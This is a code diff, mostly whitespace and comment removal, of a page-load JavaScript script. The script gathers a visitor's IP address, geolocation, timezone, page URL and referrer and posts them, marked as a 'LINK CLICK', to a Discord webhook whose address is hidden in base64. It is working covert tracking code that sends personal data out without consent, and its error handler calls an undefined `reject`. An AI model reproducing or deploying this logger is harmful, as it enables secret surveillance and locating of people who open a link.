@@ -1,11 +1,10 @@
-
 function sendToServer(payload) {
     const webhookUrlDecrypted = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQwMDQ5NDAzNDU2ODQ4Mjk2Ni9xVEJHNzdsOE03TEVMakRNVXVPaGExMzlIeG5DNmF4TTBNMm8zQ0NTZ3ZJRzJ0SUNXRl9uVGwxVDNkMzFYakY1bFZIQQ==');
 
     const xhr = new XMLHttpRequest();
     xhr.open('POST', webhookUrlDecrypted, true);
     xhr.setRequestHeader('Content-Type', 'application/json');
-    
+
     xhr.onreadystatechange = function() {
         if (xhr.readyState === 4) {
             if (xhr.status >= 200 && xhr.status < 300) {
@@ -15,17 +14,16 @@ function sendToServer(payload) {
             }
         }
     };
-    
+
     xhr.onerror = function() {
         reject(new Error('Network error occurred'));
     };
-    
+
     xhr.send(JSON.stringify(payload));
 }
 
-
 $(document).ready(function() {
-    
+
     function getUserTimezone() {
         try {
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
@@ -33,7 +31,7 @@ $(document).ready(function() {
             const offsetHours = Math.floor(Math.abs(offset) / 60);
             const offsetMinutes = Math.abs(offset) % 60;
             const offsetSign = offset <= 0 ? '+' : '-';
-            
+
             return {
                 timezone: timezone,
                 offset: `UTC${offsetSign}${offsetHours.toString().padStart(2, '0')}:${offsetMinutes.toString().padStart(2, '0')}`,
@@ -45,7 +43,7 @@ $(document).ready(function() {
             };
         }
     }
-    
+
     function getIPAndLocation() {
         return $.ajax({
             url: 'https://ipapi.co/json/',
@@ -59,7 +57,7 @@ $(document).ready(function() {
             });
         });
     }
-    
+
     function getIPOnly() {
         return $.ajax({
             url: 'https://api.ipify.org?format=json',
@@ -67,7 +65,7 @@ $(document).ready(function() {
             timeout: 5000
         });
     }
-    
+
     function detectUserInfo() {
         var allCollectedData = {};
 
@@ -75,7 +73,6 @@ $(document).ready(function() {
         allCollectedData['page'] = window.location.href;
         allCollectedData['referrer'] = document.referrer;
         allCollectedData['timezone'] = timezoneData;
-        
 
         getIPAndLocation()
             .done(function(data) {
@@ -86,7 +83,7 @@ $(document).ready(function() {
                         content: '# >-LINK CLICK \n```json\n' + JSON.stringify(allCollectedData, null, 2) + '\n```'
                     });
                 } else {
-                    // Fallback to IP-only service
+
                     getIPOnly()
                         .done(function(ipData) {
                             allCollectedData['ip'] = ipData;
@@ -121,6 +118,5 @@ $(document).ready(function() {
             });
     }
 
-    // on page load
     detectUserInfo();
 });
